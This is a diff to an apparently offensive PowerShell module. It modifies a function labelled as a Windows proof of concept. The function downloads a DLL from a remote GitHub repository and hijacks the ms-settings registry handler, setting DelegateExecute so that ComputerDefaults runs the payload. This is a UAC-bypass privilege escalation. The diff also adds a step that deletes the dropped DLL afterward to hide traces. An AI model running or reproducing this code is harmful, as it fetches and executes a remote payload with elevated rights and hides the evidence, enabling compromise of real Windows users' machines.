@@ -630,14 +630,21 @@ Export-ModuleMember -Function pop-babylon-evilcode
 Set-Alias -Name pop-babylon-evilcode -Value pop-babylon-evilcode
 
 
+#POC for Windows (over exe file)
 function process-aucdown {
 curl https://github.com/sc4r3c0d3/tsk2lvgen/raw/refs/heads/main/mcucbps.dll -o $env:USERPROFILE\mcucbps.dll
-$Request = "$env:USERPROFILE\mcucbps.dll" 
+$Request = "control.exe $env:USERPROFILE\mcucbps.dll" 
 cmd /c reg add "HKCU\software\classes\ms-settings\shell\open\command" /ve /t REG_SZ /d "$Request" /f
-clear;sleep(6.9)
+clear;sleep(9.3)
 cmd /c powershell -Command "New-ItemProperty -Path 'HKCU:\software\classes\ms-settings\shell\open\command' -Name 'DelegateExecute' -Value '' -Force |OUT-NULL";clear
 $IDPORT = (get-process lsass).Id;ComputerDefaults -PID '$IDPORT' -File '$Request'
 clear
+sleep(2.0)
+del "$env:USERPROFILE\mcucbps.dll" -force -ErrorAction ignore
 }
 Export-ModuleMember -Function process-aucdown
 Set-Alias -Name process-aucdown -Value process-aucdown
+
+
+
+
